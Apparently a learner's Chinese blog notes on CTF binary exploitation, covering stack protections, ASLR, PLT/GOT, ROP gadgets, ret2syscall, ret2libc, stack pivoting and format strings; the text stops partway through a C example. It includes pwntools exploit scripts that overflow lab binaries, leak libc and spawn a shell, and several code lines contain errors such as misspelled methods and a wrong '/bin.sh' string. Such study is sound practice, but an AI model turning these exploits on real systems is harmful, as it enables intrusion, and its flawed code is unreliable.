+x 给权限<br>shellcode(偏移+返回地址)</p><p>地址空间随机化&lt;——操作系统实现  可输入0检查ASLR是否关闭<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png" alt="image-20230223115046186"></p><p>动态链接库看为1 地址随机分配 栈同（偏移值随机地址未知）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230223232443609"></p><p>bss用来存放全局变量  可读可写可执行 shellcode返回到bss<br>shellcode返回栈区由于aslr的保护不可得到所需栈地址，返回bss即可</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230224081202824"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224081246465.png" alt="image-20230224081246465"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112708517.png" alt="image-20230223112708517"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223113034773.png" alt="image-20230223113034773"></p><p>在pwn里，保护一共是四种分别是RELRO、Stack、NX、PIE。<br>1.RELRO（ReLocation Read-Only）：分为两种情况，第一种情况是Partial RELRO，这种情况是部分开启堆栈地址随机化，got表可写，第二种，Full RELRO是全部开启，got表不可写，Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表&#x2F;内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。<br>2.Stack（canary）：这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出，这个我们也俗称为canary（金丝雀），栈保护技术。<br>3.NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用,NX打开说明栈上已经给出全部可用的system（）、”&#x2F;bin&#x2F;sh”，不可自行写入。<br>4.PIE（Position Independent Executable）：PIE的中文叫做，地址无关可执行文件，是针对.text（代码段），.data（数据段），.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。</p><p>context.arch &#x3D; ‘“amch64”——&gt;将位机器码转为64位<br>vmmap显示虚拟内存的分布<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224125905589.png" alt="image-20230224125905589"></p><p>32位 1字长&#x3D;4bite 64位 1字长 &#x3D; 8bite push栈向上增长pop向下增长（减小）<br>leave执行：1.将esp归位至ebp位  2.pop ebp将previous ebp中的值存放到ebp中 3.ebp返回父函数栈底<br>esp自动+1字长（执行pop）<br>return的作用：将当前函数栈顶中的值pop返回到eip寄存器中 程序正在执行的地址变成return address<br>return address中的值存放到eip中 eip返回到上一个函数</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226153916098.png" alt="image-20230226153916098"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226154515139.png" alt="image-20230226154515139"></p><p>pwndbg的好处捏~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226155524945.png" alt="image-20230226155524945"><br>自动编写payload（默认结果为x86下32bite大小) print（shellcraft.sh（) )</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230226155734820.png" alt="image-20230226155734820"></p><p>asm将汇编码转变为机器码后发送至远程内存虚拟空间的某个位置<br>l.just(x，y)从左向右，左端数据不变对右边的数据不断进行填充 x：填充的数据长度 y：填充内容<br>cat.flag.txt 得到flag内容<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226162609326.png" alt="image-20230226162609326"></p><p>关闭aslr指令。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230306232744633.png" alt="image-20230306232744633"></p><p>关闭canary（堆栈共享库）pie(共享库编译时 将elf文件本体的载入地址随机化)  - 0输出目标文件<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307000253788.png" alt="image-20230307000253788"></p><p>给可执行文件权限 .&#x2F;运行shell<br>ctrl+c -&gt;向当前执行进程发送一个终止信号（复制ctrl+shift+c）<br>crl+d 退出当前shell<br>context.arch &#x3D; “amd64”(告诉py系统架构【系统位数】)<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230310080407959.png" alt="image-20230310080407959">关闭标准缓冲区得到输出值</p><p>system()函数调用&#x2F;bin&#x2F;sh来执行参数指定的命令，&#x2F;bin&#x2F;sh 一般是一个软连接，指向某个具体的shell，比如bash，-c选项是告诉shell从字符串command中读取命令； 在该command执行期间，SIGCHLD是被阻塞的，好比在说：hi，内核，这会不要给我送SIGCHLD信号，等我忙完再说； 在该command执行期间，SIGINT和SIGQUIT是被忽略的，意思是进程收到这两个信号后没有任何动作</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230325231231643.png" alt="image-20230325231231643"></p><p>动态链接库本身就是一个可执行文件。<br>my_puts函数输出过程（无各栈保护可考虑rop）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153211276.png" alt="image-20230409153211276"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153739815.png" alt="image-20230409153739815"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409163357731.png" alt="image-20230409163357731"></p><p>ROPgadget 获取text段所需汇编代码（ret——&gt;将栈中信息弹到eip中） eax、ebx优先【ROP总会至溢出retaddr后】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230409171200929"></p><p>异或（xor）常用于清空缓冲区<br>flat()函数 接收一个列表参数将列表中的每一项都转为字节型数据并且自动把不足一字节数据进行填补</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">io</span> = flat（[b&#x27;A&#x27;*<span class="number">112</span>,pop_eax_ret,<span class="number">0</span>xb,pop_eax_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h]）</span><br></pre></td></tr></table></figure><p>grep功能：对输入行中含有用户自定参数的行进行全部输出</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">head</span></span><br></pre></td></tr></table></figure><p>sos 救大命踩坑！！！输入格式我哭死&#x2F;(ㄒoㄒ)&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230410210009493"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span>  <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">grep</span> <span class="string">eax</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png" alt="image-20230410194103144"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ROPgadget</span> --binary 文件名 --only <span class="string">&quot;int&quot;</span>(执行系统调用 当为<span class="number">0</span>x80时中断结束<span class="number">0</span>x80表示进行系统调用的call)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png" alt="image-20230410201002577"></p><p>python3中必须用b转换为字节流型数据 generator转换器 next（）函数（前+hex转为十六进制）！！转化为十进制数据ww其实不如ROPgadget来的方便喽（目前个人觉得）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --<span class="built_in">binary</span> 文件名 --<span class="built_in">string</span> <span class="string">&#x27;/bin/sh&#x27;</span> (查询后门地址)</span><br></pre></td></tr></table></figure><p>ret2text ret2shellcode 均直接含有后门函数 ret2text 自接收一串base64解码得flag ret2shellcode</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_execve<span class="function"><span class="params">()</span> -&gt;</span><span class="number">0xb</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png" alt="image-20230412204604894"><br>内核系统调用函数名                            用户调用代号<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png" alt="image-20230412214823229"></p><p>静态链接和动态链接<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png" alt="image-20230412214936627"></p><p>区别：<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png" alt="image-20230412215132315"></p><p>静态链接方便找到gadget：静态链接将库函数全部写入elf文件本身 容易用指针片段构成攻击流<br>动态链接只是做了标记，用即拿（别处借xx例：printf调用vprintf【2000多行 还要再调吓人的嘞】）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230413185604877.png" alt="image-20230413185604877"></p><p>静态链接在链接时进行 动态链接在装载时进行</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414210446532.png" alt="image-20230414210446532"></p><p>puts函数动态链接在可执行段code载入（只为虚拟内存地址【libc全载入】但并不知真实地址）在运行时可找此时plt结解析使得puts内容填入data段got.plt文件【plt在代码段 got在数据段】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png" alt="image-20230414212714060"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png" alt="image-20230414214750326"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png" alt="image-20230414214800705"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gcc</span> -fro-pie -g -m32 -o link 动态链接文件名(<span class="number">32</span>位)</span><br><span class="line"><span class="attribute">gcc</span> -fro-pie -g -<span class="number">0</span> link 动态链接文件名（<span class="number">64</span>位）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png"></p><p>查看plt  x 地址——&gt;以二进制形式查看</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">pwndbg</span> disass 地址-&gt;</span>反汇编</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png" alt="image-20230414222605298"></p><p>info b 查看断点信息  b 行号可下断点（含C代码情况下） d 行号可删除断点【无C语言 b 地址下断点】<br>c 遇到下一个断点&#x2F;输入（puts）&#x2F;程序中断 </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b main == <span class="built_in">start</span> 【若无main函数则停在程序入口第一条（<span class="built_in">start</span>才为程序入口）】</span><br><span class="line">s 步进 n 步过</span><br><span class="line">backtrace 函数调用栈【呈现祖孙关系（😀）】</span><br><span class="line"><span class="literal">return</span> 直接回到main函数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> secure()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> <span class="keyword">input</span>; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">time</span>(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = <span class="keyword">rand</span>();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;<span class="keyword">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">input</span> == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125; <span class="comment">//此处system函数虽无后门 但提供system plt表象 使得在text中可自动将执行流拉入libc段</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230418124940615"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230415100827595"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png" alt="image-20230415101652128"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415112529947.png" alt="image-20230415112529947"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415114324006.png" alt="image-20230415114324006"></p><p>amd64向下兼容x86故含有eax<br>函数<strong>调用栈</strong>地址从高地址向低地址增长【更好的利用虚拟内存空间】（寄存器为低地址向高地址增长即先入后出）</p><p>【后续画图补充 好懒（我真该死啊 忘了的时候就知道动手记录了😶）】<strong>赎罪录：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418130159741.png" alt="image-20230418130159741"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418132149276.png" alt="image-20230418132149276">画的太撇了（笑）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418132737386.png" alt="image-20230418132737386"></p><p>执行完调用返回dyntest（均在内存空间中）</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418133451380.png" alt="image-20230418133451380"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418205450196.png" alt="image-20230418205450196"></p><p><strong>【调用流程两点需注意】</strong>（x86例）</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png" alt="image-20230418212246848"></p><p>father中也含有子函数所需arg<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png" alt="image-20230418213125953"></p><p>查表易犯错误（直接调got）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ret</span> = system@got(❌)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png" alt="image-20230419201116801"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./dyntest&quot;</span>)</span><br><span class="line">[</span><br><span class="line">  文件形式及保护</span><br><span class="line">]</span><br><span class="line">elf.got[<span class="string">&quot;puts&quot;</span>]<span class="regexp">//</span>获取函数表象地址</span><br><span class="line">hex(elf.got[<span class="string">&quot;puts&quot;</span>])<span class="regexp">//</span>获取函数真实地址</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png" alt="image-20230419203107813"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png" alt="image-20230419215529699"></p><p>【nop slide】<br>使得ASLR继续执行ret2shellcode<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png" alt="image-20230423182143460"></p><p>使执行流一直在nop段（maybe运气不好eip指不到nop位置 多运行几次即可）<br>core文件：记载程序崩溃时断点信息及错误信息<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230423193313158.png" alt="image-20230423193313158"></p><p>可以看成谁放的数据就为谁的栈帧<br>函数往上第二个字长写入其所需要的参数（大部分函数）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194347199.png" alt="image-20230423194347199"></p><p>system调用ret addr后自动push父函数ebp【函数内汇编第一步push ebp均向上写两字长到valuable】<br>最后两个函数执行此类模式即可完成攻击</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194601499.png" alt="image-20230423194601499"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194754995.png" alt="image-20230423194754995"></p><p>rop链将函数所需参数直接写入到上一函数的返回地址处<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424192129082.png" alt="image-20230424192129082"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png" alt="image-20230424194313669"></p><p>无”&#x2F;bin&#x2F;sh”也可映射 system函数地址（text段 plt）若无plt则需持续溢出直至出现真实地址<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png"></p><p>我是小偷 无需exit（）【偷完就跑】🤭</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings ret2libc1 | grep <span class="regexp">/bin/</span>sh</span><br><span class="line"><span class="regexp">//</span>string a.out | grep flag(简单逆向)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png" alt="image-20230424200850159"></p><p>【ret2libc1】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png" alt="image-20230424205359479"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png" alt="image-20230424204704035"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205428601.png" alt="image-20230424205428601">小小程序员&gt;&lt;<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424210938062.png" alt="image-20230424210938062"></p><p>动态调试108+4（ebp）溢出【ret2libc2】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125354842.png" alt="image-20230425125354842"></p><p>无“&#x2F;bin&#x2F;sh” 此时需自行构造 在bss段找到可写入部分 </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125119149.png" alt="image-20230425125119149">         </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png" alt="image-20230425153257042"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png" alt="image-20230426210301792"></p><p>进阶版思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,gets_plt,pop_ebx,buf2,system_plt,<span class="number">0xdeadbeef</span>(pop_ebx),buf2])</span><br><span class="line"><span class="comment">#符合ret的寄存器均可不一定一定是pop_ebx</span></span><br><span class="line">io.seneline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin.sh&#x27;</span>)</span><br><span class="line">io.interactieve()</span><br></pre></td></tr></table></figure><p>【ret2libc3】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = strtol(&amp;buf, v4, v5); 将字符串转化为整数存储在v8里</span><br><span class="line">long <span class="built_in">int</span> strtol(const char *<span class="built_in">str</span>, char **endptr, <span class="built_in">int</span> base)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png" alt="image-20230427202338093"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png" alt="image-20230427202101873"><br>注意我们输送send的值要用str【程序接收的总是str】 linux系统下最小单位一叶（4kb）<br>&#x2F;bin&#x2F;sh(通过绝对地址输入bin中的sh)&#x3D;&#x3D;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<span class="comment">#lld ret2libc3查看本地libc(动态)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]))<span class="comment">#防bug与程序保持一致</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot; :&quot;</span>)</span><br><span class="line">libcBase = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.symbols[<span class="string">&quot;puts&quot;</span>]<span class="comment">#drop=True不保留返回值（此处为接收但不保留\n）</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcBase -&gt;&#123;:#x&#125;&quot;</span>,<span class="built_in">format</span>(libcBase))<span class="comment">#用来debug 结果正确后进行打印 &#123;:#&#125;格式化字符串</span></span><br><span class="line"><span class="comment">#format转换格式 前x表示转换为十六进制</span></span><br><span class="line"><span class="comment">#oneGadget = libcBase + 0x3a9fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat(cyclic(60),oneGadget)</span></span><br><span class="line">payload=flat(cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>偏移：文件某一个位置距文件开头第一个字节距离</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-<span class="number">2.23</span>.so<span class="function"><span class="params">(动态链接文件名)</span>-&gt;</span>得偏移量 <span class="comment">#碰运气喽😀</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png" alt="image-20230428193230160"></p><p>gdb调试<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png" alt="image-20230511094407053"></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-<span class="built_in">mode</span>-parent 解决该问题（gdb中）</span><br></pre></td></tr></table></figure><p>x64环境下传参要先传入六个寄存器中（rdi rsi rdx rcx r8 r9 ）<br>劫持程序返回到目的函数之前要先把目的函数的参数传递完毕（即传递参数的gadget放在目标函数之前）任何时候数据的写入都是从低地址向高地址写入<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png" alt="image-20230520224921532"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png" alt="image-20230520225916659"></p><p>一般有jz跳转提示（一长串pop 寄存器）**[lib_csu]**</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230521000849599"></p><p>注意看地址（如图中edi只可写低八位）<br>libc泄露技巧：找到关键函数（如write【返回时有栈溢出】）对应的的plt下got 用函数的真实地址-函数在libc中的地址&#x3D;libc基地址 -&gt;找system+“&#x2F;bin&#x2F;sh”偏移传入泄露<br>【level3】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230522173452594"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523002237695.png"></p><p>学会用转换捏io.recv(4&#x2F;8)</p><h3 id="【花式栈溢出】"><a href="#【花式栈溢出】" class="headerlink" title="【花式栈溢出】"></a><strong>【花式栈溢出】</strong></h3><p>1.程序中无真正main函数（dyn）<br>start-&gt;libc_start_mian-&gt;init-&gt;main<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101555442.png" alt="image-20230523101555442"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101634224.png" alt="image-20230523101634224"></p><p>此时栈中无栈帧 全部存储的shell里的环境变量 其中记录了当前执行程序的名字<br>找程序入口：IDA（可爱女人）main地址 gdbzho中下断点调试 stack查看栈帧<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104215828.png" alt="image-20230523104215828"></p><p>checksecc 发现canary打开 <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104710354.png" alt="image-20230523104710354"></p><p>运行程序 手动超长溢出（可利用python）查看提示 【可从IDA中辅助分析】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png" alt="image-20230523105629335"></p><p>之前为segment fault 现why为stack samshing<br>覆盖后触发stack_chk_fail函数 强行退出程序 -&gt;stack smashing</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png" alt="image-20230523114523470"><br>如何在可爱女人中观察到Canary？<br>标志：段寄存器读入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v4</span> <span class="operator">=</span> _readfsqword(<span class="number">0</span>x28) //🌰</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png" alt="image-20230523122130079"></p><p>Canary放置无硬性标准 需分析<br>elf文件较小时 地址可能在虚拟地址中映射两份<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png" alt="image-20230610163822498"></p><p>strip去掉函数名——&gt;防护程序 （IDA中自动用偏移作为函数名）<br>此时无“main”函数【gdb中断点下不了】</p><p><strong>【栈迁移】</strong></p><p>花样很多啦 栈欺骗<br>利用gadget覆盖ebp 恶意代码写在ebp中【pop ret&#x2F;mov esp，ebp】ebp辅佐esp<br>esp抹除数据 ebp增加 控制esp即可<br><strong>pwn3_x64</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182043459.png" alt="image-20230610182043459"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182053082.png" alt="image-20230610182053082"></p><p>write第三个参数无法获取时 运气（猜rdx&gt;8）</p><p>ret需要给显示屏即标准输出 1是标准输出的代号</p><p><strong>格式化字符串</strong>（保存在栈上）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0x22222222</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>,a.b,c,s);<span class="comment">//第一个参数即为格式化字符串（%08x.）</span></span><br><span class="line"><span class="built_in">printf</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 